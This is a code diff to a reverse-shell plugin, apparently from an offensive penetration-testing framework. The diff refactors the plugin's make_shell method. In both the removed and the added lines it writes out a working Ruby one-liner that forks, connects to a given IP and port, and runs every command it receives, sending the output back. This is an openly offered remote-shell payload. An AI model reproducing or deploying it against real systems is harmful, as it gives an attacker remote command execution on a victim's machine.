@@ -1,4 +1,4 @@
-from ogabog.cores import plugin, const
+from ogabog.cores import plugin
 
 
 class ReverseTCP(plugin.ReverseShell):
@@ -22,6 +22,5 @@ class ReverseTCP(plugin.ReverseShell):
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
 
     def make_shell(self):
-        self.shell = """ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{}","{}");while(cmd=c.gets);IO.popen(cmd,"r")""".format(
-            self.args.ip, self.args.port)
-        self.shell += """{|io|c.print io.read}end'"""
+        self.shell = f"""ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{self.args.ip}","{self.args.port}");"""
+        self.shell += """while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'"""
